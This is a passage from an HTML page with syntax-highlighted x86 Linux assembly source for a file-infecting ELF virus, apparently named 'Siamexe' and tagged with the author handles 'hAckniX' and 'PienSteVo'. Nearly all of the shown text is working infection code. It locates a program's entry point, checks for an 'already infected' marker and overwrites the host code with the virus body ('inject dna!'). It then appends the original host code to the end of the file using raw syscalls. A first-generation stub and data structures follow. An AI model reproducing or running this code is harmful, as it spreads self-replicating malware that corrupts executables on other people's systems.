    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">got_phdr</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">nxt_phdr</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">unmap_spce</span><span class="sc0">                          </span><span class="sc1">; there is no valid ph !</span><span class="sc0">

      </span><span class="sc5">got_phdr</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get EIP</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; get offsetsegment file offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                                 </span><span class="sc1">; save offset from beginnig of psegment</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">; in ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapAdress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; goto EIP in map</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">unmap_spce</span><span class="sc0">                          </span><span class="sc1">;already infected</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; get segment size</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">unmap_spce</span><span class="sc0">                          </span><span class="sc1">; sgm too small</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">        </span><span class="sc1">; create a stack frame</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; write host code there!</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                               </span><span class="sc1">; inject dna!</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapAdress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_munmap</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                 </span><span class="sc1">; unmap file</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_write</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                 </span><span class="sc1">; write host cod at EOF</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">heap_end</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">mmap_fail</span><span class="sc0">
      </span><span class="sc5">unmap_spce</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">MapAdress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SYS_munmap</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                 </span><span class="sc1">; unmap file</span><span class="sc0">

      </span><span class="sc5">mmap_fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_close</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                 </span><span class="sc1">; close file</span><span class="sc0">

      </span><span class="sc5">open_fail</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; NAME   * MapFile                                                         ;</span><span class="sc0">
</span><span class="sc1">; DESCR  * Map ze specified file in memory                                 ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; INPUT  * EBX = handle of ze file                                         ;</span><span class="sc0">
</span><span class="sc1">;    * ECX = size to map                                                   ;</span><span class="sc0">
</span><span class="sc1">; OUTPUT * EAX = adr of the memory map                                     ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">MapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">mmap_arg</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; get mmap struct</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; set map size</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">       </span><span class="sc1">; set file handle</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SYS_mmap</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">                                 </span><span class="sc1">; eax hold MapAdr</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0xFFFFF000</span><span class="sc0">
    </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">no_map_pb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc5">no_map_pb</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">end_of_host</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; Some DATAZZ...                               ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"[hAckniX &lt;@))&gt;&lt; PienSteVo]"</span><span class="sc0">
</span><span class="sc5">end_of_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">heap_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">DirStream</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc1">; ptr on the DIR struct</span><span class="sc0">
</span><span class="sc5">FileHandle</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapHandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapAdress</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MapSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">FileSize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">HostFileName</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc1">;ptr on the host filename string</span><span class="sc0">

</span><span class="sc1">; space for stat struct</span><span class="sc0">
</span><span class="sc5">stat</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_dev</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;__pad1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_ino</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_mode</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_nlink</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_uid</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_gid</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;st_rdev</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">;__pad2</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_size</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_blksize</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_blocks</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_atime</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;__unused1</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_mtime</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;__unused2</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;st_ctime</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;__unused3</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;__unused4</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">;__unused5</span><span class="sc0">

</span><span class="sc5">dirent</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc1">;ze dirent struct</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; d_ino</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; d_off</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">           </span><span class="sc1">; d_reclen</span><span class="sc0">
    </span><span class="sc9">times</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">         </span><span class="sc1">; d_name[256]</span><span class="sc0">

</span><span class="sc5">mmap_arg</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; addr   =&gt; no specified adr</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; len</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000003h</span><span class="sc0">       </span><span class="sc1">; prot   =&gt; RW attributes</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000001h</span><span class="sc0">       </span><span class="sc1">; flags  =&gt; MAP_PRIVATE</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; fd</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">       </span><span class="sc1">; offset =&gt; offset null</span><span class="sc0">

</span><span class="sc5">heap_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc1">; First generation                                   ;</span><span class="sc0">
</span><span class="sc1">;-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú-ú;</span><span class="sc0">
</span><span class="sc5">first_msg</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"this is Siamexe first generation stub!"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">first_msg_len</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">first_msg</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">first_msg_len</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">+</span><span class="sc5">first_msg</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01</span><span class="sc1">;stdout</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc1">;write</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc1">;exit</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">

</span></div></body>
</html>
